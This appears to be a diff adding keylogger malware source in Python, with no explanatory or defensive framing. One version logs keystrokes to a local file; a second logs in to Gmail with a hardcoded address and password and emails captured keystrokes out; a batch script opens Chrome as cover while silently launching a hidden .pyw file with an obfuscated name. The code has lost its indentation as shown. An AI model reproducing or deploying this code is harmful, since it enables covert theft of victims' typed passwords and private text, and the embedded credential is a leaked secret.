@@ -1,0 +1,72 @@
+#Normal
+from pynput.keyboard import Listener
+def anonymous (key): 
+key = str(key)
+key = key.replace("'","")
+if key == "Key.f7":
+raise SystemExit(0)
+if key == "Key.ctrl_l":
+key = "\n"
+if key == "Key.enter": 
+key = "\n"
+if key == "Key.alt_l": 
+key = "\n"
+if key == "Key.tab": 
+key = "\n"
+with open("bytelog.txt", "a") as file: file.write(key)
+#print(key)
+with Listener (on_press=anonymous) as VoidX:
+VoidX.join()
+
+
+
+
+#Email Send
+import smtplib
+from pynput.keyboard import Listener
+email = 'testerguy10m@gmail.com'
+password = 'pwxcgeurhdxrhhdh'
+session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
+session.starttls() #enable security
+session.login(email, password) #login with mail_id and password
+#logger
+full_log=''
+word=''
+email_char_limit = 50
+def anonymous (key):
+global word
+global full_log
+global email
+global email_char_limit
+key = str(key)
+key = key.replace("'","")
+if key == "Key.f12":
+raise SystemExit(0)
+if key == "Key.ctrl_l":
+key = "\n"
+if key == "Key.enter": 
+key = "\n"
+full_log += word
+word= "\n"
+if len(full_log) >= email_char_limit:
+# send_log()
+send_log()
+full_log = ''
+if key == "Key.alt_l": 
+key = "\n"
+if key == "Key.tab": 
+key = "\n"
+with open("bytelog.txt", "a") as file: file.write(key)
+#print(key)
+def send_log():
+session.sendmail(email,email,full_log)
+with Listener (on_press=anonymous) as VoidX:
+VoidX.join()
+
+
+
+#.BAT
+start "" "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" 
+D:
+cd 4f6b5c3a2b1e
+start "" "D:\4f6b5c3a2b1e \QmFzZTY0.pyw"
